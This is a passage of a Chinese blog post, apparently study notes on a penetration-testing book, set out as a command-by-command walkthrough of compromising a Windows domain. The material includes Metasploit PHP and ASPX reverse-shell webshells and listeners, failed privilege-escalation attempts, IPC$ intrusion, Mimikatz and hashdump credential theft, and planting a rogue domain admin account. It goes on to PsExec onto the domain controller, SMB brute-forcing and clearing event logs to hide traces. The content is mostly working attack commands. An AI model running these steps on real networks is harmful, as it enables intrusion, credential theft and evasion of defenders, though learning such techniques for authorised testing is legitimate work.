+<p><strong>知识点</strong>：该脚本需要再目标机器上创建文件从而触发杀毒软件，建议运行前关闭杀毒软件</p>
+</li>
+</ol>
+<h2 id="5-2-Web后门"><a href="#5-2-Web后门" class="headerlink" title="5.2 Web后门"></a>5.2 Web后门</h2><p>泛指WebShell，实质是一段网页代码</p>
+<ol>
+<li><p>Meterpreter后门</p>
+<p>利用PHP Meterpreter的Payload，利用该模块创建具有Meterpreter功能的PHP WebShell。具体步骤</p>
+<ol>
+<li>使用msfvenom创建一个webshell.php</li>
+<li>上传webshell.php到目标服务器</li>
+<li>运行Metasploit multi-handler开始监听</li>
+<li>访问webshell.php界面</li>
+<li>获得反弹的Metasploit Shell</li>
+</ol>
+<p>具体命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.1 -f raw &gt; tmp.php<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>-p 用于设置Payload</li>
+<li>-f 用于设置输出文件格式</li>
+</ul>
+<p>上传到服务器后，启动msfconsole进行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.1<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>之后访问上传的地址，之后会发现服务端反弹成功</p>
+</li>
+<li><p>Aspx Meterpreter后门</p>
+<p>介绍metasploit下的shell_reverse_tcp 的Payload，利用该模块可创建具有Meterpreter功能的各版本ShellCode，例如Asp,Aspx,msi,vbs,war等以下以Aspx为例</p>
+<p>大致流程与之前的PHP Shell相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">show payloads<br>use windows/shell_reverse_tcp<br>info<br><span class="hljs-built_in">set</span> lhost 192.168.31.247<br><span class="hljs-built_in">set</span> lport 4666<br>save<br><span class="hljs-comment"># 接着输入generate -h查看帮助命令</span><br>generate -h<br><span class="hljs-comment"># 生成个版本的ShellCode命令如下</span><br>generate -t asp <span class="hljs-comment"># 生成asp的shellcode</span><br>generate -t aspx <span class="hljs-comment"># 生成aspx的shellcode</span><br><br><span class="hljs-comment"># 使用如下命令进行监听</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.31.247<br><span class="hljs-built_in">set</span> lport 4666<br>run<br></code></pre></div></td></tr></table></figure></li>
+</ol>
+<h1 id="6-内网域渗透实例"><a href="#6-内网域渗透实例" class="headerlink" title="6. 内网域渗透实例"></a>6. 内网域渗透实例</h1><h2 id="6-1-渗透环境介绍"><a href="#6-1-渗透环境介绍" class="headerlink" title="6.1 渗透环境介绍"></a>6.1 渗透环境介绍</h2><p>首先介绍此次渗透的环境：假设我们现在已经渗透了一台服务器PAVMSEF21，该服务器内网IP为10.51.0.21。扫描后发现内网网络结构大概如下图所示，其中PAVMSEF21是连接外网和内网的关键节点，内网的其他服务器均不能直接连接</p>
+<p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804152818.png" srcset="/img/loading.gif" lazyload></p>
+<p>假设此时我们已经获取了普通的WebShell</p>
+<h2 id="6-2-提升权限"><a href="#6-2-提升权限" class="headerlink" title="6.2 提升权限"></a>6.2 提升权限</h2><p>上传payload到机器21上，之后使用meterpreter监听获取Meterpreter Shell</p>
+<p>之后查看目标机权限发现是普通域用户权限</p>
+<p>查看目标系统的信息，发现服务器补丁打的很全参数使用MS1505和MS15078</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/ms15_051_client_copy_image<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>最后两个都失败了</p>
+<p>再尝试绕过Windows账户控制(UAC)，使用Bypass UAC模块提权，又失败了，如果成功会返回一个新的Meterpreter Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>使用Bypass UAC模块提权，需要系统当前用户在管理员组，且用户账户管理程序UAC设置为默认</p>
+<h2 id="6-3-信息收集"><a href="#6-3-信息收集" class="headerlink" title="6.3 信息收集"></a>6.3 信息收集</h2><p>虽然此时的提权不成功，但还是可以进行域渗透测试的。有了内网的第一台机器的权限后，就到了很关键的一步——收集信息，它也是内网渗透中不可或缺的一部分。<br>首先要查看当前机器的网络环境，收集域里的相关信息，包括所有的用户、所有的计算机，以及相关关键组的信息，下面列出了常用的命令及其作用</p>
+<ul>
+<li>net user /domain：查看域用户</li>
+<li>net view /domain：查看有几个域</li>
+<li>net view /domain： XXX：查看域内的主机</li>
+<li>net group /domain：查看域里面的组</li>
+<li>net group “domain computers” /domain：查看域内所有的主机名</li>
+<li>net group “domain admins” /domain：查看域管理员</li>
+<li>net group “domain controllers” /domain：查看域控制器</li>
+<li>net group “enterprise admins” /domain：查看企业管理组</li>
+<li>net time /domain：查看时间服务器</li>
+</ul>
+<p>通过收集以上信息,我们可以分析出很多重要的线索，例如内网是怎么划分的，各机器名的命名规则，根据机器名尝试找出重要人物的计算机，以及目标机是否为多层域结构,关键是要探测出域管理员的名字和域服务器的名字等信息</p>
+<h2 id="6-4-获取一台服务器的权限"><a href="#6-4-获取一台服务器的权限" class="headerlink" title="6.4 获取一台服务器的权限"></a>6.4 获取一台服务器的权限</h2><p>我们的目标是域服务器，此时有两种情况，当前服务器可以总结攻击域服务器，和不可直接攻击域服务器。不可攻击又分为两种情况：如果是权限不够就需要提升权限；如果是不能连接到域服务器，则需要攻击内网中能够连接到域服务器的服务器</p>
+<p>当前是因为权限问题无法攻击，可以尝试以下方法</p>
+<ol>
+<li>使用Meterpreter目前拥有的权限添加内网路由，进行弱口令扫描</li>
+<li>使用PowerShell对内网进行扫描(要求目标机是Windows 7以上的服务器)</li>
+<li>架设Socks4a，然后Socks会自动进行内网扫描</li>
+<li>利用当前权限进行内网IPC$渗透</li>
+<li>其他方法</li>
+</ol>
+<p>通过上面的分析，我们先选择最简单的方法，输入net view命令，在列举的机器名里选择一个和我们机器名相似的服务器来试试，不出意外的话，成功率很高</p>
+<p>此处温习经典IPC$入侵</p>
+<p>IPC$入侵：即通过使用Windows 系统中默认启动的IPC$共享获得计算机控制权的入侵，在内网中极其常见<br>假设现在有一台IPC$主机:127.0.0.25，输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net use \127.0.0.25Vipc$ <span class="hljs-comment">#连接127.0.0.25的IPC$共享</span><br>copy srv.exe \127.0.0.25\ipc$ <span class="hljs-comment">#复制srv.exe到目标主机</span><br>net time \127.0.0.25 <span class="hljs-comment">#查时间</span><br>at \127.0.0.25 10: 50 srv.exe <span class="hljs-comment">#用at命令在10点50分启动srv.exe (注意这里设置的时间要比主机时间快)</span><br></code></pre></div></td></tr></table></figure>
+
+<p>at是让机器在指定时间做指定的事情的命令</p>
+<p>这里将payload上传到服务器，at启动，获取对应的Meterpreter Shell</p>
+<p>同理查看在该机器上的权限和相关信息</p>
+<p>此时获得了目标机的system权限，此时可以使用Mimikatz等工具和run post/windows/gather/hashdump来抓hash。同样需要注意Mimikatz在64位机器上需要将进程迁移到64位程序进程中才能查看密码明文</p>
+<p>此处能够利用Mimikatz获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">upload mi.exe c:\<br>mi.exe <span class="hljs-comment"># j即可获取明文密码</span><br></code></pre></div></td></tr></table></figure>
+
+<p>接着查看抓到的域用户权限</p>
+<p>net user joao.guerino /domain</p>
+<h2 id="6-5-PowerShell-寻找域管在线服务器"><a href="#6-5-PowerShell-寻找域管在线服务器" class="headerlink" title="6.5 PowerShell 寻找域管在线服务器"></a>6.5 PowerShell 寻找域管在线服务器</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用.NET Framework的强大功能。PowerShell还允许将几个命令组合起来放到文件里执行，实现文件级的重用，也就是说具有脚本的性质</p>
+<p>这里先使Power View脚本来获取当域管理员在线登录的服务器，我们将Power View脚本的Invoke-User Hunter模块上传到主机名为PAVMSEP131，IP为10.51.0.131的服务器中，然后输入Invoke-UserHunter<br>具体命令如下所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command<br><span class="hljs-string">&quot;&amp;(Import-Module.\powerview.ps1;lnvoke-UserHunter&#125;&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>结果如图</p>
+<p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804163728.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到域管理员当前在线登录的主机名位30 IP为10.51.0.30，此时需要入侵此服务器，然后将其迁移到域管理所在的进程，这样便拥有了域管理的权限</p>
+<h2 id="6-6-获取域管权限"><a href="#6-6-获取域管权限" class="headerlink" title="6.6 获取域管权限"></a>6.6 获取域管权限</h2><p>现在已经成功地获取主机名为PAVMSXD30，IP为10.51.0.30的服务器权限,接下来就可以渗透域控了。首先输入getsystem命令提升权限，成功获得权限</p>
+<p>然后输入ps命令找到域管理所在的进程，把Meterpreter Shell进程迁移到此进程中,成功后就获得了域管理权限</p>
+<p>这里除了迁移进程，也可以使用Metasploit中的窃取令牌功能，同样能获得获得域管理权限。<br>接着查看主域控IP，这里使用net time命令，一般来说时间服务器都是域服务器</p>
+<p>这里可以得到域服务器的主机名为PAVMSAD64，IP地址为10.51.0.63</p>
+<p>现在我们依旧使用经典的IPC$入侵来反弹一个Meterpreter Shell，和之前相同这里提示at已经被废除，所以改换使用<code>schtasks</code>来添加计划任务</p>
+<p>现在在域管理原权限下了，所以再添加一个管理员账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net user sonicwall passw0rk!@3 /ad /domain<br><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sonicwall /ad /domain<br><span class="hljs-comment"># 使用如下命令确认是否添加成功</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="6-7-登录域控制"><a href="#6-7-登录域控制" class="headerlink" title="6.7 登录域控制"></a>6.7 登录域控制</h2><p>现在已经获取了域控的权限，接下来登录域控然后抓取域控的Hash</p>
+<p>常见登录方式：</p>
+<ul>
+<li>利用IPC上传AT&amp;Schtasks远程执行命令</li>
+<li>利用端口转发或者Socks登录域控远程桌面</li>
+<li>登录对方内网的一台计算机使用PsTools工具包中的PsExec来反弹Shell</li>
+<li>使用Metasploit下的PsExec.、psexec_psh、lmpacket psexec、pth-winexe、Empire Invoke-Psexec等PsExec类工具反弹Shell</li>
+<li>使用Metasploit下的smb_login来反弹Meterpreter</li>
+<li>使用WMI (Windows Management Instrumentation)来进行攻击</li>
+<li>使用PsRemoting posershel远程执行命令</li>
+<li>其他一些方法</li>
+</ul>
+<p>这里采用最常见也是效果最好的方式，即Metasploit下的PsExec来反弹Meterpreter，使用时要注意以下这两点</p>
+<ul>
+<li>MSF中的PsExec模块</li>
+<li>cuestom模块，建议使用类似Veil之类的工具来生成免杀的Payload</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> smbuser sonicwalll<br><span class="hljs-built_in">set</span> smbpass Passw0rk!@3<br><span class="hljs-built_in">set</span> smbdomain HEDABIL<br><span class="hljs-built_in">set</span> rhost 10.51.0.64<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>获取shell之后依旧进行进程迁移获取信息</p>
+<p><strong>思路</strong>：可以看到现阶段控制的session共有5个。session1为WebShell反弹，session2利用ipc$入侵，渗透session4的目的是获取域管在线服务器，session5为域。整个渗透过程一环套一环,环环相扣</p>
+<p>有了域控的权限,接着来抓Hash，常用方法有以下这几种</p>
+<ul>
+<li>使用Metasploit自带的dumphash或者smart_hashdump模块导出用户的Hash</li>
+<li>利用PowerShell的相应模块导出Hash</li>
+<li>使用WCE、Mimikatz等工具</li>
+<li>其他方法</li>
+</ul>
+<p>这里使用了Metasploit自带的dumphash模块。需要注意，要想使用此模块导出Hash，必须有SYSTEM的权限才行,具体操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use post/windows/gather/smart_hashdump<br>show options<br><span class="hljs-built_in">set</span> session 5<br>run<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="6-8-SMB爆破内网"><a href="#6-8-SMB爆破内网" class="headerlink" title="6.8 SMB爆破内网"></a>6.8 SMB爆破内网</h2><p>有了域控的密码，现在在内网扩大权限具体操作</p>
+<ol>
+<li>利用当前获取的域控账户密码，对域控IP进行扫描</li>
+<li>使用SMB下的smb_login模块</li>
+<li>端口转发或者Socks代理进内网</li>
+</ol>
+<p>先在Metasploit添加路由，然后使用smb_login模块或者psexec_scanner模块进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_login<br><span class="hljs-built_in">set</span> rhost 10.51.0.1 /24<br><span class="hljs-built_in">set</span> smbuser **<br><span class="hljs-built_in">set</span> smbpass **<br><span class="hljs-built_in">set</span> smbdomain MEDABIL<br><span class="hljs-built_in">set</span> threads 16<br>creds<br></code></pre></div></td></tr></table></figure>
+
+<p>我们获取了大量内网服务器的密码，下面就可以畅游内网了。可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或者第三方软件。<br>这里简单地使用Meterpreter的端口转发即可</p>
+<h2 id="6-9-清理日志"><a href="#6-9-清理日志" class="headerlink" title="6.9 清理日志"></a>6.9 清理日志</h2><p>清理日志主要有以下步骤</p>
+<ol>
+<li>删除之前添加的域管理账户</li>
+<li>删除所有在渗透过程中使用过的工具</li>
+<li>删除应用程序、系统和安全日志</li>
+<li>关闭所有的Meterpreter连接</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ba"># shell下删除添加用户<br>net user sonicwalll /del<br>logoff<br># 删除日志 meter下<br>clearev<br># msf下关闭连接 sessions -k<br></code></pre></div></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%B9%A6%E7%B1%8D-Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/">书籍 Web安全攻防-渗透测试实战指南</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Metasploit/">Metasploit</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>MyBlog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
